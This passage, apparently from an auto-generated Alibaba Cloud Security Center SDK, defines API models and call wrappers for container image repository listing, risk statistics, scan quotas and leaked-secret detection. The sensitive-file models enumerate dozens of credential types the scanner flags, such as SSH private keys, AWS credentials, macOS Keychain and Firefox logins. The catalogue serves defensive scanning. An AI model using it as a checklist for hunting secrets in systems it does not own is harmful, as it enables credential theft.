    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about image repositories.
 *
 * @param request DescribeImageRepoDetailListRequest
 * @return DescribeImageRepoDetailListResponse
 */
async function describeImageRepoDetailList(request: DescribeImageRepoDetailListRequest): DescribeImageRepoDetailListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageRepoDetailListWithOptions(request, runtime);
}

model DescribeImageRepoListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  fieldName?: string(name='FieldName', description='The name of the field that is used for the query. Valid values:

*   **repoName**: the name of the image repository
*   **repoNamespace**: the namespace to which the image repository belongs

>  This parameter takes effect only when the **OperateType** parameter is set to **other**.', example='repoName'),
  fieldValue?: string(name='FieldValue', description='The value of the field that is used for the query.

>  This parameter takes effect only when the **OperateType** parameter is set to **other**.', example='zeus'),
  operateType?: string(name='OperateType', description='The type of the operation. Valid values:

*   **count**: counts statistics
*   **other**: others', example='count'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='script7'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
  targetType?: string(name='TargetType', description='The condition by which the feature is applied. Valid values:

*   **image_repo**: the ID of the image repository

This parameter is required.', example='image_repo'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **image_repo**: image repository protection

This parameter is required.', example='image_repo'),
}

model DescribeImageRepoListResponseBody = {
  addTargetCount?: int32(name='AddTargetCount', description='The number of image repositories that are added to Security Center.', example='20'),
  allTargetCount?: int32(name='AllTargetCount', description='The total number of image repositories.', example='25'),
  delTargetCount?: int32(name='DelTargetCount', description='The number of excluded image repositories.', example='5'),
  imageRepoList?: [ 
    {
      flag?: string(name='Flag', description='Indicates whether the feature takes effect on the image repository. Valid values:

*   **add**: yes
*   **del**: no', example='add'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='zeus'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='sas-script'),
    }
  ](name='ImageRepoList', description='An array that consists of the information about image repositories.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of image repositories.', example='83'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeImageRepoListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageRepoListResponseBody(name='body'),
}

/**
 * @summary Queries the statistics and configurations of the feature that protects images.
 *
 * @param request DescribeImageRepoListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageRepoListResponse
 */
async function describeImageRepoListWithOptions(request: DescribeImageRepoListRequest, runtime: Util.RuntimeOptions): DescribeImageRepoListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageRepoList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics and configurations of the feature that protects images.
 *
 * @param request DescribeImageRepoListRequest
 * @return DescribeImageRepoListResponse
 */
async function describeImageRepoList(request: DescribeImageRepoListRequest): DescribeImageRepoListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageRepoListWithOptions(request, runtime);
}

model DescribeImageRiskLevelStatisticResponseBody = {
  imageRiskLevelList?: [ 
    {
      cnt?: int32(name='Cnt', description='The count of images for this risk level.', example='12'),
      imageRiskLevel?: string(name='ImageRiskLevel', description='The image risk level. Valid values：
 - **3**：High
- **2**：Medium
- **1**：Low
- **0**：None', example='0'),
    }
  ](name='ImageRiskLevelList', description='Risk information at the image level, including risks from vulnerability, baseline, and malicious file detection.'),
  requestId?: string(name='RequestId', description='The ID of this call request, which is a unique identifier generated by Alibaba Cloud for this request and can be used to troubleshoot and locate issues.', example='A60DA4EC-7CD8-577D-AD73-******'),
}

model DescribeImageRiskLevelStatisticResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageRiskLevelStatisticResponseBody(name='body'),
}

/**
 * @summary Query the distribution of image risk levels.
 *
 * @param request DescribeImageRiskLevelStatisticRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageRiskLevelStatisticResponse
 */
async function describeImageRiskLevelStatisticWithOptions(runtime: Util.RuntimeOptions): DescribeImageRiskLevelStatisticResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeImageRiskLevelStatistic',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query the distribution of image risk levels.
 *
 * @return DescribeImageRiskLevelStatisticResponse
 */
async function describeImageRiskLevelStatistic(): DescribeImageRiskLevelStatisticResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageRiskLevelStatisticWithOptions(runtime);
}

model DescribeImageScanAuthCountResponseBody = {
  imageScan?: {
    imageScanCapacity?: long(name='ImageScanCapacity', description='The quota for container image scan.', example='15340'),
    instanceId?: string(name='InstanceId', description='The instance ID of Security Center.', example='sas-qdl123412****'),
    scanCount?: long(name='ScanCount', description='The consumed quota for container image scan.', example='5489'),
  }(name='ImageScan', description='The details about the quota for container image scan.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='892NYH839-0EDC-4CD0-A2EF-5BD294656C99'),
}

model DescribeImageScanAuthCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageScanAuthCountResponseBody(name='body'),
}

/**
 * @summary Queries the details of the quota for container image scan.
 *
 * @param request DescribeImageScanAuthCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageScanAuthCountResponse
 */
async function describeImageScanAuthCountWithOptions(runtime: Util.RuntimeOptions): DescribeImageScanAuthCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeImageScanAuthCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of the quota for container image scan.
 *
 * @return DescribeImageScanAuthCountResponse
 */
async function describeImageScanAuthCount(): DescribeImageScanAuthCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageScanAuthCountWithOptions(runtime);
}

model DescribeImageSecurityScanCountRequest {
  clusterId?: string(name='ClusterId', description='Cluster ID for image security scanning.', example='cdbbe7aa56cbf4b8f830f83718d26****'),
  dealed?: string(name='Dealed', description='Whether it has been processed. Values:
- **Y**: Processed 
- **N**: Not processed 
- **A**: All', example='N'),
  imageDigest?: string(name='ImageDigest', description='SHA256 value of the image digest.', example='a7978d51f5eddf7612ab15ae46bd4b4257bf59da77c2aafc9d9d8ab41bb3****'),
  imageTag?: string(name='ImageTag', description='Image tag.', example='c958b80f-prd_default-9bb0****'),
  imageUuid?: string(name='ImageUuid', description='Image UUID.', example='325bfa067ae6c678e59e8a1b34cc****'),
  repoId?: string(name='RepoId', description='Container image repository ID.', example='3df5b5a1f2339eb7ebc7d474b8d4****'),
  repoInstanceId?: string(name='RepoInstanceId', description='Specifies the container image instance ID.

> Call the [DescribeImageInstances](~~DescribeImageInstances~~) API to obtain this parameter.', example='cri-p2jahwuuwuk7****'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the container image repository.', example='cn-beijing'),
  scanRange?: [ string ](name='ScanRange', description='Scanning scope.'),
  uuids?: [ string ](name='Uuids', description='Instance IDs for image security scanning.'),
}

model DescribeImageSecurityScanCountResponseBody = {
  data?: {
    imageBaselineCount?: int32(name='ImageBaselineCount', description='Number of image baseline risk points in the current asset.', example='0'),
    imageCveVulCount?: int32(name='ImageCveVulCount', description='Number of cve vulnerabilities in the current page.', example='0'),
    imageMaliciousFileCount?: int32(name='ImageMaliciousFileCount', description='Number of malicious samples in the current page.', example='0'),
    imageScaVulCount?: int32(name='ImageScaVulCount', description='Number of sca vulnerabilities in the current page.', example='0'),
  }(name='Data', description='Returned data.'),
  requestId?: string(name='RequestId', description='The ID of the current request, which is a unique identifier generated by Alibaba Cloud for this request and can be used for troubleshooting and problem localization.', example='C699E4E4-F2F4-58FC-A949-457FFE59****'),
}

model DescribeImageSecurityScanCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageSecurityScanCountResponseBody(name='body'),
}

/**
 * @summary Get Image Security Event Count.
 *
 * @param request DescribeImageSecurityScanCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageSecurityScanCountResponse
 */
async function describeImageSecurityScanCountWithOptions(request: DescribeImageSecurityScanCountRequest, runtime: Util.RuntimeOptions): DescribeImageSecurityScanCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageSecurityScanCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Get Image Security Event Count.
 *
 * @param request DescribeImageSecurityScanCountRequest
 * @return DescribeImageSecurityScanCountResponse
 */
async function describeImageSecurityScanCount(request: DescribeImageSecurityScanCountRequest): DescribeImageSecurityScanCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageSecurityScanCountWithOptions(request, runtime);
}

model DescribeImageSensitiveFileByKeyRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='0083a31ccf7c10367a6e783e8601****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  scanRange?: [ string ](name='ScanRange', description='The type of the asset that you want to scan. Valid values:

*   **image**
*   **container**'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The type of alerts for the sensitive files. Valid values:

*   **npm_token**: Node Package Manager (NPM) access token
*   **ftp_cfg**: FTP configuration
*   **google_oauth_key**: Google OAuth key
*   **planetscale_passwd**: PlanetScale password
*   **github_ssh_key**: Github SSH key
*   **msbuild_publish_profile**: MSBuild publish profile
*   **fastly_cdn_token**: Fastly CDN token
*   **ssh_private_key**: SSH private key
*   **aws_cli**: Amazon Web Services (AWS) CLI credentials
*   **cpanel_proftpd**: cPanel ProFTPD credentials
*   **postgresql_passwd**: PostgreSQL password
*   **discord_client_cred**: Discord client credentials
*   **rails_database**: Rails database configuration
*   **aws_access_key**: AWS Access Key
*   **esmtp_cfg** :Extended Simple Mail Transfer Protocol (ESMTP) configuration
*   **docker_registry_cfg**: Docker image repository configuration
*   **pem**: Privacy-Enhanced Mail (PEM)
*   **common_cred**: common credentials
*   **sftp_cfg**: Secure File Transfer Protocol (SFTP) connection configuration
*   **grafana_token**: Grafana token
*   **slack_token**: Slack token
*   **ec_private_key**: EC private key
*   **pypi_token**: Python Package Index (PyPI) token
*   **finicity_token**: Finicity token
*   **k8s_client_key**: Kubernetes private key
*   **git_cfg**: Git configuration
*   **django_key**: Django key
*   **jenkins_ssh**: Jenkins SSH configuration file
*   **openssh_private_key**: OpenSSL private key
*   **square_oauth**: OAuth credential for Square
*   **typeform_token**: Typeform token
*   **common_database_cfg**: general database connection configuration
*   **wordpress_database_cfg**: WordPress database configuration
*   **googlecloud_api_key**: API key for Google Cloud
*   **vscode_sftp**: VSCode SFTP configuration
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: PlanetScale token
*   **contentful_preview_token**: preview token for Contentful
*   **php_database_cfg**: database password for a PHP application
*   **atom_remote_sync**: Atom remote synchronization configuration
*   **aws_session_token**: AWS session token
*   **atom_sftp_cfg**: Atom SFTP configuration
*   **asana_client_private_key**: Asana client key
*   **tencentcloud_ak**: secret ID of a third-party cloud
*   **rsa_private_key**: Rivest-Shamir-Adleman (RSA) private key
*   **github_personal_token**: personal access token for GitHub
*   **pgp**: Pretty Good Privacy (PGP) encrypted file
*   **stripe_skpk**: Stripe secret key
*   **square_token**: Square access token
*   **rails_carrierwave**: Rails Carrierwave credential
*   **dbeaver_database_cfg**: DBeaver database configuration
*   **robomongo_cred**: Robomongo credentials
*   **github_oauth_token**: OAuth access token for GitHub
*   **pulumi_token**: Pulumi token
*   **ventrilo_voip**: Ventrilo VoIP server configuration
*   **macos_keychain**: macOS Keychain
*   **amazon_mws_token**: Amazon MWS token
*   **dynatrace_token**: Dynatrace token
*   **java_keystore**: Java KeyStore (JKS)
*   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database
*   **kubernetes_dashboard_cred**: user credentials for Kubernetes Dashboard
*   **atlassian_token**: Atlassian token
*   **rdp**: remote desktop protocol (RDP)
*   **mailgun_key**: Mailgun webhook signing key
*   **mailchimp_api_key**: API key for Mailchimp
*   **netrc_cfg**: .netrc configuration file
*   **openvpn_cfg**: OpenVPN configuration
*   **github_refresh_token**: GitHub refresh token
*   **salesforce**: Salesforce credentials
*   **salesforce**: Sendinblue credentials
*   **pkcs_private_key**: PKCS#12 key
*   **rubyonrails_passwd**: Ruby on Rails password file
*   **filezilla_ftp**: FileZilla FTP configuration
*   **databricks_token**: Databricks token
*   **gitLab_personal_toke**: personal access token for GitLab
*   **rails_master_key**: Rails master key
*   **sqlite**: SQLite3 or SQLite database
*   **firefox_logins**: Firefox logon configuration
*   **mailgun_private_token**: Mailgun private token
*   **joomla_cfg**: Joomla configuration
*   **hashicorp_terraform_token**: HashiCorp Terraform token
*   **jetbrains_ides**: JetBrains IDEs configuration
*   **heroku_api_key**: Heroku API key
*   **messagebird_token**: MessageBird token
*   **messagebird_token**: MessageBird token
*   **hashicorp_vault_token**: HashiCorp Vault token
*   **pgp_private_key**: PGP private key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: secret access key of a third-party cloud
*   **aws_s3cmd**: AWS S3cmd configuration
*   **php_config**: PHP configuration
*   **common_private_key**: private key of a common type
*   **microsoft_mdf**: Microsoft SQL Server database
*   **mediawiki_cfg**: MediaWiki configuration
*   **jenkins_cred**: Jenkins credentials
*   **rubygems_cred**: RubyGems credentials
*   **clojars_token**: Clojars token
*   **phoenix_web_passwd**: Phoenix web credentials
*   **puttygen_private_key**: PuTTYgen private key
*   **google_oauth_token**: Google OAuth access token
*   **rubyonrails_cfg**: Ruby On Rails database configuration
*   **lob_api_key**: Lob API key
*   **pkcs_cred**: PKCS#12 certificate
*   **otr_private_key**: Off-the-Record Messaging (OTR) private key
*   **contentful_delivery_token**: delivery token for Contentful
*   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration
*   **dsa_private_key**: Digital Signature Algorithm (DSA) private key
*   **rails_app_token**: Rails app token
*   **git_cred**: Git user credential
*   **newrelic_api_key**: User API key for New Relic
*   **github_hub**: hub configuration for storing GitHub tokens
*   **rubygem**: Rubygem Token', example='google_oauth_key'),
}

model DescribeImageSensitiveFileByKeyShrinkRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='0083a31ccf7c10367a6e783e8601****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  scanRangeShrink?: string(name='ScanRange', description='The type of the asset that you want to scan. Valid values:

*   **image**
*   **container**'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The type of alerts for the sensitive files. Valid values:

*   **npm_token**: Node Package Manager (NPM) access token
*   **ftp_cfg**: FTP configuration
*   **google_oauth_key**: Google OAuth key
*   **planetscale_passwd**: PlanetScale password
*   **github_ssh_key**: Github SSH key
*   **msbuild_publish_profile**: MSBuild publish profile
*   **fastly_cdn_token**: Fastly CDN token
*   **ssh_private_key**: SSH private key
*   **aws_cli**: Amazon Web Services (AWS) CLI credentials
*   **cpanel_proftpd**: cPanel ProFTPD credentials
*   **postgresql_passwd**: PostgreSQL password
*   **discord_client_cred**: Discord client credentials
*   **rails_database**: Rails database configuration
*   **aws_access_key**: AWS Access Key
*   **esmtp_cfg** :Extended Simple Mail Transfer Protocol (ESMTP) configuration
*   **docker_registry_cfg**: Docker image repository configuration
*   **pem**: Privacy-Enhanced Mail (PEM)
*   **common_cred**: common credentials
*   **sftp_cfg**: Secure File Transfer Protocol (SFTP) connection configuration
*   **grafana_token**: Grafana token
*   **slack_token**: Slack token
*   **ec_private_key**: EC private key
*   **pypi_token**: Python Package Index (PyPI) token
*   **finicity_token**: Finicity token
*   **k8s_client_key**: Kubernetes private key
*   **git_cfg**: Git configuration
*   **django_key**: Django key
*   **jenkins_ssh**: Jenkins SSH configuration file
*   **openssh_private_key**: OpenSSL private key
*   **square_oauth**: OAuth credential for Square
*   **typeform_token**: Typeform token
*   **common_database_cfg**: general database connection configuration
*   **wordpress_database_cfg**: WordPress database configuration
*   **googlecloud_api_key**: API key for Google Cloud
*   **vscode_sftp**: VSCode SFTP configuration
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: PlanetScale token
*   **contentful_preview_token**: preview token for Contentful
*   **php_database_cfg**: database password for a PHP application
*   **atom_remote_sync**: Atom remote synchronization configuration
*   **aws_session_token**: AWS session token
*   **atom_sftp_cfg**: Atom SFTP configuration
*   **asana_client_private_key**: Asana client key
*   **tencentcloud_ak**: secret ID of a third-party cloud
*   **rsa_private_key**: Rivest-Shamir-Adleman (RSA) private key
*   **github_personal_token**: personal access token for GitHub
*   **pgp**: Pretty Good Privacy (PGP) encrypted file
*   **stripe_skpk**: Stripe secret key
*   **square_token**: Square access token
*   **rails_carrierwave**: Rails Carrierwave credential
*   **dbeaver_database_cfg**: DBeaver database configuration
*   **robomongo_cred**: Robomongo credentials
*   **github_oauth_token**: OAuth access token for GitHub
*   **pulumi_token**: Pulumi token
*   **ventrilo_voip**: Ventrilo VoIP server configuration
*   **macos_keychain**: macOS Keychain
*   **amazon_mws_token**: Amazon MWS token
*   **dynatrace_token**: Dynatrace token
*   **java_keystore**: Java KeyStore (JKS)
*   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database
*   **kubernetes_dashboard_cred**: user credentials for Kubernetes Dashboard
*   **atlassian_token**: Atlassian token
*   **rdp**: remote desktop protocol (RDP)
*   **mailgun_key**: Mailgun webhook signing key
*   **mailchimp_api_key**: API key for Mailchimp
*   **netrc_cfg**: .netrc configuration file
*   **openvpn_cfg**: OpenVPN configuration
*   **github_refresh_token**: GitHub refresh token
*   **salesforce**: Salesforce credentials
*   **salesforce**: Sendinblue credentials
*   **pkcs_private_key**: PKCS#12 key
*   **rubyonrails_passwd**: Ruby on Rails password file
*   **filezilla_ftp**: FileZilla FTP configuration
*   **databricks_token**: Databricks token
*   **gitLab_personal_toke**: personal access token for GitLab
*   **rails_master_key**: Rails master key
*   **sqlite**: SQLite3 or SQLite database
*   **firefox_logins**: Firefox logon configuration
*   **mailgun_private_token**: Mailgun private token
*   **joomla_cfg**: Joomla configuration
*   **hashicorp_terraform_token**: HashiCorp Terraform token
*   **jetbrains_ides**: JetBrains IDEs configuration
*   **heroku_api_key**: Heroku API key
*   **messagebird_token**: MessageBird token
*   **messagebird_token**: MessageBird token
*   **hashicorp_vault_token**: HashiCorp Vault token
*   **pgp_private_key**: PGP private key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: secret access key of a third-party cloud
*   **aws_s3cmd**: AWS S3cmd configuration
*   **php_config**: PHP configuration
*   **common_private_key**: private key of a common type
*   **microsoft_mdf**: Microsoft SQL Server database
*   **mediawiki_cfg**: MediaWiki configuration
*   **jenkins_cred**: Jenkins credentials
*   **rubygems_cred**: RubyGems credentials
*   **clojars_token**: Clojars token
*   **phoenix_web_passwd**: Phoenix web credentials
*   **puttygen_private_key**: PuTTYgen private key
*   **google_oauth_token**: Google OAuth access token
*   **rubyonrails_cfg**: Ruby On Rails database configuration
*   **lob_api_key**: Lob API key
*   **pkcs_cred**: PKCS#12 certificate
*   **otr_private_key**: Off-the-Record Messaging (OTR) private key
*   **contentful_delivery_token**: delivery token for Contentful
*   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration
*   **dsa_private_key**: Digital Signature Algorithm (DSA) private key
*   **rails_app_token**: Rails app token
*   **git_cred**: Git user credential
*   **newrelic_api_key**: User API key for New Relic
*   **github_hub**: hub configuration for storing GitHub tokens
*   **rubygem**: Rubygem Token', example='google_oauth_key'),
}

model DescribeImageSensitiveFileByKeyResponseBody = {
  code?: string(name='Code', description='The status code returned. If the 200 status code is returned, the request was successful.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4NjE='),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  sensitiveFileList?: [ 
    {
      advice?: string(name='Advice', description='The suggestion.', example='Assess risks based on business conditions, remove risky content, and rebuild image'),
      description?: string(name='Description', description='The description of the sensitive file.', example='Verify the validity of the leaked AK.'),
      filePath?: string(name='FilePath', description='The file path.', example='/usr/lib/abc.txt'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1663321552000'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1663691592000'),
      layerDigest?: string(name='LayerDigest', description='The digest of the image.', example='0083a31cc0083a31ccf7c10367a6e783e8601e290f7c10367a6e783e860****'),
      md5?: string(name='Md5', description='The MD5 value of the sensitive file.', example='b484b0dff093f358897486b58266****'),
      promt?: string(name='Promt', description='The sensitive content.', example='AKPIDteow289f9s************'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
      sensitiveFileKey?: string(name='SensitiveFileKey', description='The type of the alert for the sensitive file. Valid values:

*   **npm_token**: NPM access token
*   **ftp_cfg**: FTP configuration
*   **google_oauth_key**: Google OAuth key
*   **planetscale_passwd**: PlanetScale password
*   **github_ssh_key**: Github SSH key
*   **msbuild_publish_profile**: MSBuild publish profile
*   **fastly_cdn_token**: Fastly CDN token
*   **ssh_private_key**: SSH private key
*   **aws_cli**: Amazon Web Services (AWS) CLI credential
*   **cpanel_proftpd**: cPanel ProFTPD credential
*   **postgresql_passwd**: PostgreSQL password file
*   **discord_client_cred**: Discord client credential
*   **rails_database**: Rails database configuration
*   **aws_access_key**: AWS Access Key
*   **esmtp_cfg**: Extended Simple Mail Transfer Protocol (ESMTP) configuration
*   **docker_registry_cfg**: configuration of a Docker image repository
*   **pem**: Privacy-Enhanced Mail (PEM)
*   **common_cred**: common credential
*   **sftp_cfg**: configuration of connection over Secure File Transfer Protocol (SFTP)
*   **grafana_token**: Grafana token
*   **slack_token**: Slack token
*   **ec_private_key**: Elliptic Curve (EC) private key
*   **pypi_token**: Python Package Index (PyPI) token
*   **finicity_token**: Finicity token
*   **k8s_client_key**: private key for the Kubernetes client
*   **git_cfg**: Git configuration
*   **django_key**: Django key
*   **jenkins_ssh**: SSH configuration file for Jenkins
*   **openssh_private_key**: OpenSSH private key
*   **square_oauth**: Square OAuth credential
*   **typeform_token**: Typeform token
*   **common_database_cfg**: configuration of general database connection
*   **wordpress_database_cfg**: WordPress database configuration
*   **googlecloud_api_key**: API key for Google Cloud
*   **vscode_sftp**: VSCode SFTP configuration
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: PlanetScale token
*   **contentful_preview_token**: preview token for Contentful
*   **php_database_cfg**: database password for a PHP application
*   **atom_remote_sync**: Atom remote synchronization configuration
*   **aws_session_token**: AWS session token
*   **atom_sftp_cfg**: Atom SFTP configuration
*   **asana_client_private_key**: Asana client key
*   **tencentcloud_ak**: secret ID of a third-party cloud
*   **rsa_private_key**: Rivest-Shamir-Adleman (RSA) private key
*   **github_personal_token**: personal access token for GitHub
*   **pgp**: Pretty Good Privacy (PGP) encrypted file
*   **stripe_skpk**: Stripe secret key
*   **square_token**: Square access token
*   **rails_carrierwave**: Rails Carrierwave credential
*   **dbeaver_database_cfg**: DBeaver database configuration
*   **robomongo_cred**: RoboMongo credential
*   **github_oauth_token**: OAuth access token for GitHub
*   **pulumi_token**: Pulumi token
*   **ventrilo_voip**: configuration of a Ventrilo VoIP server
*   **macos_keychain**: macOS Keychain
*   **amazon_mws_token**: Amazon MWS token
*   **dynatrace_token**: Dynatrace token
*   **java_keystore**: Java KeyStore (JKS)
*   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database
*   **kubernetes_dashboard_cred**: user credential for Kubernetes Dashboard
*   **atlassian_token**: Atlassian token
*   **rdp**: remote desktop protocol (RDP)
*   **mailgun_key**: Mailgun webhook signing key
*   **mailchimp_api_key**: API key for Mailchimp
*   **netrc_cfg**: netrc configuration file
*   **openvpn_cfg**: configuration of the OpenVPN client
*   **github_refresh_token**: GitHub refresh token
*   **salesforce**: Salesforce credential
*   **salesforce**: Sendinblue token
*   **pkcs_private_key**: PKCS#12 private key
*   **rubyonrails_passwd**: Ruby on Rails password file
*   **filezilla_ftp**: FileZilla FTP configuration
*   **databricks_token**: Databricks token
*   **gitLab_personal_toke**: personal access token for GitLab
*   **rails_master_key**: Rails master key
*   **sqlite**: SQLite3 or SQLite database
*   **firefox_logins**: Firefox logon configuration
*   **mailgun_private_token**: Mailgun private token
*   **joomla_cfg**: Joomla configuration
